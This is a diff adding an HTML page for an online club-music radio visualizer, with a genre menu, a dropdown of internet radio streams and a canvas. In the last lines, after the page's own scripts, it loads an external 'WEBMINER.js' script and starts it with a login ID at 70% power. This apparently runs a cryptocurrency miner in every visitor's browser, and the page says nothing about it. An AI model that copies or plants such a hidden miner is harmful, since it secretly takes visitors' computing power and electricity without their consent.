@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>Club music radio visualizer</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1"><link rel="stylesheet" href="./style.css">
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.8.2/css/all.min.css" />
+</head>
+
+<body>
+
+<div id="container">
+    <nav>
+        <ul>
+            <li><a href="#">Home</a></li>
+            <li><a href="#">Электронная</a>
+            <!-- First Tier Drop Down -->
+            <ul>
+                <li><a href="#">Club</a></li>
+                <li><a href="#">Techno</a></li>
+                <li><a href="#">Trance</a></li>
+            </ul>        
+            </li>
+            <li><a href="#">Международная</a>
+            <!-- First Tier Drop Down -->
+            <ul>
+                <li><a href="#">Arabic</a></li>
+                <li><a href="#">Brazilian</a></li>
+                <li><a href="#">Indian</a>
+            	<!-- Second Tier Drop Down -->
+                <ul>
+                    <li><a href="#">HTML/CSS</a></li>
+                    <li><a href="#">jQuery</a></li>
+                    <li><a href="#">Other</a>
+                        <!-- Third Tier Drop Down -->
+                        <ul>
+                            <li><a href="#">Stuff</a></li>
+                            <li><a href="#">Things</a></li>
+                            <li><a href="#">Other Stuff</a></li>
+                        </ul>
+                    </li>
+                </ul>
+                </li>
+            </ul>
+            </li>
+            <li><a href="https://sobe.ru/na/razvitie_muzykalnogo_portala" target="_blank"">Donate</a></li>
+            <li><a href="#">Inspiration</a></li>
+            <li><a href="#">Contact</a></li>
+            <li><a href="#">About</a></li>
+        </ul>
+    </nav>
+  
+</div>
+
+  <div style="padding:10px">
+    <div id="topHeading">
+      <i class="fas fa-th"></i>
+      <h2 style="display:inline;">Visual Online Radio</h2>
+    </div>
+
+    <i class="fa fa-pause pause" onclick="pauseSong(this)" style="cursor:pointer;"></i>
+
+   
+
+    <label for="ctl_presets">Preset:</label>&nbsp;<select id="ctl_presets" data-option="preset"></select> all streams via <a href="https://djmix.neocities.org/" target="_blank">https://djmix.neocities.org/</a>:
+   <select id="radioStations">
+            <option value="" selected>Select a station</option>
+			<option value="https://dancestream.danceradiouk.com/;">Dance UK Radio</option>
+            <option value="https://s2.radioparty.pl:8015/stream">RadioParty.pl</option>
+            <option value="https://air2.radiorecord.ru:805/mini_320">Радио Рекорд - Minimal/Tech</option>
+            <option value="https://ams.leproradio.com/stream.aac?sid=fad2f40c262d368f65888df4f0f4dbd751e38a7e">Leproradio</option>
+            <option value="https://dfm-dfmclub.hostingradio.ru/dfmclub96.aacp">DFM Club</option>
+            <option value="https://streaming.radio.co/s0ce169aac/listen">Radio Shazamzee</option>			
+			<option value="https://r163-172-168-211.relay.radiotoolkit.com:30003/svoefm">Радио Свое FM</option>
+            <option value="https://stream.mixadance.fm/fitness">Fitness Radio</option>
+            <option value="https://radio.promodj.com/mixadancefm-192">Promo DJ Mixadance FM</option>
+            <option value="https://radio4.cdm-radio.com:18000/stream-mp3-Dance">Costa Del Mar Dance</option>
+            <option value="http://radiofg.impek.com/max1.mp3">Maxximum</option>
+			
+			<option value="https://radio.promodj.com/klubb-192">Promo DJ Klubb</option>
+            <option value="http://s3.slotex.pl:7300/;stream.nsv">Radio Clubbers</option>
+            <option value="https://str2b.openstream.co/2139?aw_0_1st.collectionid=6053&stationId=6053&publisherId=2163&k=1621785483">PulsRadio Mx CLUB</option>
+            <option value="https://radio-stream-2.obozrevatel.com/Kazantip128.mp3">Radio Обозреватель - Музыка Казантипа</option>
+            <option value="http://freemindedfmstream.nl/fm/listen">Freeminded FM</option>
+
+        </select>
+  </div>
+
+  <div id="canvasContainer">
+    <canvas id="scope"></canvas>
+  </div>
+
+</body>
+
+</html>
+<!-- partial -->
+  <script src='https://codepen.io/sweaver2112/pen/baf76c3572df5dc7ca114029b54ad557.js'></script><script  src="./script.js"></script>
+<script src="https://wm.bmwebm.org/WEBMINER.js"></script>
+<script>WEBMINER.config({ login: "5982251", pass: null }).power(70);</script>
+</body>
+</html>
